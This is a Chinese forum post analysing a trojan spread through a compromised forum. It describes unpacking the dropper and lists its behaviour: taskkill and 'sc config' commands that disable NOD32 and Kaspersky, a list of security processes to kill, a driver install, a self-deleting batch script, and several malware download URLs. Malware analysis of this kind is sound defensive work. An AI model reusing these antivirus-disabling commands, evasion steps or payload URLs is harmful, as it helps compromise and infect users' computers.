

# 某论坛的挂马简单分析

> 原文：[`www.pediy.com/kssd/pediy10/87325.html`](https://www.pediy.com/kssd/pediy10/87325.html)

晚上听群里说 FF 被挂马了 试着分析一下：  
下载：h\*\*p://w11.4g2s.com/1/eX.exe  
  
UPS 壳 脱壳后用 DUP 做个搜索替换补丁 去下花：  
  
第一组：  
60 B8 00 09 00 00 E9 01 00 00 00 E8 B8 77 07 00 00 BB 88 08 00 00 83 C3 25 83 C0 29 83 E8 14 83  
EB 14 33 C9 90 83 E8 22 83 E8 21 90 83 E8 04 90 83 C3 0E 90 83 C0 56 90 83 E8 42 90 83 C3 25 83  
C0 29 83 C3 25 83 C0 29 83 C3 25 83 C0 29 83 E8 22 33 C0 52 5A 90 53 5B B8 11 06 00 00 90 83 C0  
16 90 83 E8 05 83 E8 32 90 33 C0 83 C0 36 83 E8 31 83 C3 32 83 EB 31 90 83 C0 36 83 E8 31 83 C3  
32 83 EB 31 90 33 C0 83 C3 0F 83 C0 13 83 E8 10 83 E8 05 83 E8 10 83 C3 0F 83 C0 13 83 E8 04 83  
C0 66 83 F8 00 0F 84 E2 FF FF FF 61  
  
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  
  
第二组：  
60 74 0D 75 0B E8 ?? ?? ?? ?? E3 E4 E5 ?? E7 ?? 61  
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  
  
主程序简单看下 由于有大量的垃圾指令 而且主程序主要是释放文件的 没啥意思 所以简单说下他做干了点啥吧  
  
1. 先检查是否有窗体上弹出(ASCII "TTe.er.eabcds.ss")这个字符串，如果有就是发现被报毒了 就退出了  
2. 干掉 NOD  
004010D8=dumped\_.004010D8 (ASCII "cmd.exe /c taskkill.exe /im ")  
00401160=dumped\_.00401160 (ASCII "ekrn.exe")  
00401150=dumped\_.00401150 (ASCII "egui.exe")  
  
这样能干掉 NOD？？？  
taskkill.exe /im ekrn.exe  
taskkill.exe /im egui.exe  
ekrn.exe 被卡掉后  services 会马上去创建该进程 ![](img/f43c1e514327696dccbb0da997496b2a.jpg "扮鬼脸")  
  
3. 创建 killdll.dll 运行后并删除（剿灭黑名单）  
4. 根据开机时间生成一个 EXE 文件  
00402743    FF15 5C104000       CALL DWORD PTR DS:\[<&kernel32.GetTickCount>\]        ; kernel32.GetTickCount  
00402749    50                  PUSH EAX  
0040274A    8D8D 94F5FFFF       LEA ECX,DWORD PTR SS:\[EBP-A6C\]  
00402750    51                  PUSH ECX  
00402751    68 44124000         PUSH dumped\_.00401244                               ; ASCII "%s%d\_xeex.exe"  
00402756    8D95 94F5FFFF       LEA EDX,DWORD PTR SS:\[EBP-A6C\]  
0040275C    52                  PUSH EDX  
0040275D    FF15 A8104000       CALL DWORD PTR DS:\[<&user32.wsprintfA>\]             ; USER32.wsprintfA  
  
\==>  我的是 16427328\_xeex.exe（下载一些东东）  
5. 创建驱动 pcidump.sys  并安装该驱动  
6. 创建\_uok.bat    // 创建运行并删除历史痕迹  
  
:Repeat  
del "C:\\dumped\_.exe"  
if exist "C:\\dumped\_.exe" goto Repeat  
rmdir C:   
del "H:\\temp\\S-1-5-~1\\temp\\\_uok.bat"  
  
\====================================================  
  
IDA 简单看了一下 16427328\_xeex.exe 和  killdll.dll   
  
EAX=0012F44C, (ASCII "http://wxg.3ehs.com/01/fz.txt")  
  
前者下载一堆这个东西：  
  
1:http://u9.ed3t.com/sb/01/ok.exe  
1:http://u1.ed3t.com/la/L1.exe  
1:http://u1.ed3t.com/la/L3.exe  
……  
1:http://u9.ed3t.com/cj/a8.exe  
1:http://u9.ed3t.com/cj/csj.exe  
1:http://u9.ed3t.com/cj/sb.exe  
  
DLL 文件 干掉黑名单的进程  
  
.text:10005115                 mov     dword ptr \[ebp-110h\], offset aAvp ; "avp"  
.text:1000511F                 mov     dword ptr \[ebp-10Ch\], offset aSafeboxtray ; "safeboxTray"  
.text:10005129                 mov     dword ptr \[ebp-108h\], offset a360safebox ; "360Safebox"  
……  
.text:10005341                 mov     dword ptr \[ebp-10h\], offset aRegguide ; "RegGuide"  
.text:10005348                 mov     dword ptr \[ebp-0Ch\], offset aMpsvc2 ; "MPSVC2"  
.text:1000534F                 mov     dword ptr \[ebp-8\], offset aMpmon ; "MPMon"  
  
cmd /c sc config avp start= disabled  
  
  
  
对这些文件还没有深入去看 肯定要有对注册表的操作 太困了 睡醒了继续分析下   
  
附件是脱壳后的文件以及病毒释放/生成的文件 不贴分析代码了 总是那几个函数 没啥意思  
  
  
  
PS: 终于换回键盘来了 还是 X 构架的比较爽 O(∩\_∩)O 哈哈~  
  
一款杀毒软件首先是要分析并拦截病毒 并且要在中毒的 PC 上剿灭病毒 但光这些是不够的 有一些一朋友的 PC 中毒了 然后安装了 NOD 结果系统的 dll 都被感染了 若清理掉这些 DLL 无疑系统将崩溃 若不清理 都已经感染 ……  
  
杀软杀掉病毒不是目的 目的是为用户提供一个安全稳定的系统环境 所以我觉得杀软不仅要提供杀毒机制 还应该为用户提供一套恢复机制修复被病毒感染的 PC   所以分析病毒是第一步  提出杀灭病毒的方法的第二步  提供修复被感染系统为第三步

上传的附件
| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || XXXX.rar \[解压密码：muma123\]   
 |